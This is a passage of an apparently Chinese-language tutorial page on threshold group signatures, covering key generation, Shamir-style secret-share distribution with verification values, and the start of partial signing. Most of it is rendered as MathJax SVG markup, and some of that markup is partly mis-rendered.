width="1.303ex" height="1.595ex" role="img" focusable="false" viewBox="0 -694 576 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g></g></g></svg></mjx-container>是<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex" xmlns="http://www.w3.org/2000/svg" width="1.079ex" height="1.464ex" role="img" focusable="false" viewBox="0 -442 477 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g></g></g></svg></mjx-container>的循环群中的一个数，待签名消息为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="1.986ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 878 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>，每个成员随机选择<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 759 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mi" transform="translate(465, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>和<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.959ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 866 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(572, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>，计算：</p>
<script type="math/tex; mode=display">y_i=g^{z_i}\bmod p</script><p>成员<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.118ex" height="1.902ex" role="img" focusable="false" viewBox="0 -683 936 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(642, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>私钥为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 759 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mi" transform="translate(465, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>，组公钥<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex" xmlns="http://www.w3.org/2000/svg" width="1.109ex" height="1.464ex" role="img" focusable="false" viewBox="0 -442 490 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>计算如下：</p>
<script type="math/tex; mode=display">y=\prod_{i=1}^ny_i\bmod p</script><p>$P<em>i(i=1,2,\cdots,n)<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex" xmlns="http://www.w3.org/2000/svg" width="8.145ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 3600 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><text data-variant="normal" transform="matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">选</text><text data-variant="normal" transform="translate(900, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">取</text><text data-variant="normal" transform="translate(1800, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">一</text><text data-variant="normal" transform="translate(2700, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">个</text></g></g></g></svg></mjx-container>t-1<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex" xmlns="http://www.w3.org/2000/svg" width="10.181ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 4500 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><text data-variant="normal" transform="matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">次</text><text data-variant="normal" transform="translate(900, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">多</text><text data-variant="normal" transform="translate(1800, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">项</text><text data-variant="normal" transform="translate(2700, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">式</text><text data-variant="normal" transform="translate(3600, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">：</text></g></g></g></svg></mjx-container>f_i(x)=z_i+a</em>{i,1}x+a<em>{i,2}x^2+\cdots+a</em>{i,t-1}x^{t-1}<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex" xmlns="http://www.w3.org/2000/svg" width="14.253ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 6300 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><text data-variant="normal" transform="matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">，</text><text data-variant="normal" transform="translate(900, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">计</text><text data-variant="normal" transform="translate(1800, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">算</text><text data-variant="normal" transform="translate(2700, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">影</text><text data-variant="normal" transform="translate(3600, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">子</text><text data-variant="normal" transform="translate(4500, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">份</text><text data-variant="normal" transform="translate(5400, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">额</text></g></g></g></svg></mjx-container>f_i(x_j)\bmod q<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex" xmlns="http://www.w3.org/2000/svg" width="6.109ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 2700 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><text data-variant="normal" transform="matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">发</text><text data-variant="normal" transform="translate(900, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">送</text><text data-variant="normal" transform="translate(1800, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">给</text></g></g></g></svg></mjx-container>P_j$，并计算验证信息：</p>
<script type="math/tex; mode=display">y_{i,j}=g^{f_i(x_j)}\bmod p</script><h2 id="产生部分签名"><a href="#产生部分签名" class="headerlink" title="产生部分签名"></a>产生部分签名</h2><p>设参与签名的成员<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="12.921ex" height="1.984ex" role="img" focusable="false" viewBox="0 -683 5711 877"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(642, -150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1045.6, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1490.2, 0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(642, -150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2535.8, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(2980.4, 0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(4319.1, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(4763.8, 0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(642, -150) scale(0.707)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g></g></g></svg></mjx-container>。成员<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="16.801ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 7426.2 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(642, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(936, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1325, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1947.7, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(3003.5, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3503.5, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(3948.2, 0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(4448.2, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(4892.8, 0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(6231.5, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(6676.2, 0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mo" transform="translate(7037.2, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>选择一个随机数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="12.943ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 5720.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 